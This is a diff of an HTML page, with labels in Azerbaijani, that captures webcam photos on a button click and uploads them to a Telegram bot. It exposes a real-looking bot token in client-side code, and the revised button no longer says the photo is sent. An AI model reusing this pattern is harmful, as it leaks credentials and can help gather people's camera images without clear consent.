@@ -3,26 +3,19 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-<title>Camera → Telegram</title>
+<title>Camera to Telegram</title>
 
 <style>
-
 body{
     margin:0;
     background:#0b0b0b;
-    color:white;
+    color:#00ff99;
     font-family:Arial;
     display:flex;
     flex-direction:column;
     align-items:center;
     justify-content:center;
     height:100vh;
-}
-
-h2{
-    color:#00ff99;
-    margin-bottom:10px;
 }
 
 video{
@@ -42,16 +35,15 @@ button{
     cursor:pointer;
 }
 
-.status{
+#status{
     margin-top:10px;
     font-size:14px;
     color:#aaa;
+    text-align:center;
+    max-width:90%;
 }
 
-canvas{
-    display:none;
-}
-
+canvas{display:none;}
 </style>
 </head>
 
@@ -61,37 +53,27 @@ canvas{
 
 <video id="video" autoplay playsinline></video>
 
-<button onclick="takePhoto()">Şəkil çək və göndər</button>
+<button onclick="takePhoto()">Şəkil çək</button>
 
-<div class="status" id="status">Kamera icazəsi gözlənilir...</div>
+<div id="status">Yüklənir...</div>
 
 <canvas id="canvas"></canvas>
 
 <script>
 
 const BOT_TOKEN = "8944749495:AAEtj9RMOR-qkmNc6Z62m4ssOdS07B3o0SY";
-const CHAT_ID = "8944749545";
+const CHAT_ID = "6234777001";
 
 const video = document.getElementById("video");
 const status = document.getElementById("status");
 
 async function startCamera(){
-
     try{
-
-        const stream =
-        await navigator.mediaDevices.getUserMedia({
-            video:true
-        });
-
+        const stream = await navigator.mediaDevices.getUserMedia({ video:true });
         video.srcObject = stream;
-
-        status.innerText = "Kamera aktivdir ✔";
-
+        status.innerText = "✔ Kamera aktivdir";
     }catch(e){
-
         status.innerText = "❌ Kamera icazəsi verilmədi";
-
     }
 }
 
@@ -99,33 +81,44 @@ startCamera();
 
 function takePhoto(){
 
-    status.innerText = "📸 Şəkil çəkilir...";
+    status.innerText = "📸 Şəkil hazırlanır...";
 
-    const canvas =
-    document.getElementById("canvas");
-
+    const canvas = document.getElementById("canvas");
     canvas.width = video.videoWidth;
     canvas.height = video.videoHeight;
 
     const ctx = canvas.getContext("2d");
-
     ctx.drawImage(video,0,0);
 
     canvas.toBlob(async(blob)=>{
 
         const formData = new FormData();
-
         formData.append("chat_id", CHAT_ID);
         formData.append("photo", blob, "photo.png");
 
-        await fetch(
-        `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
-        {
-            method:"POST",
-            body:formData
-        });
+        try{
 
-        status.innerText = "✔ Telegram-a göndərildi";
+            const res = await fetch(
+            `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
+            {
+                method:"POST",
+                body:formData
+            });
+
+            const data = await res.json();
+
+            console.log(data);
+
+            if(data.ok){
+                status.innerText = "✔ Telegram-a göndərildi";
+            }else{
+                status.innerText = "❌ Error: " + data.description;
+            }
+
+        }catch(err){
+            console.log(err);
+            status.innerText = "❌ Network error";
+        }
 
     }, "image/png");
 }
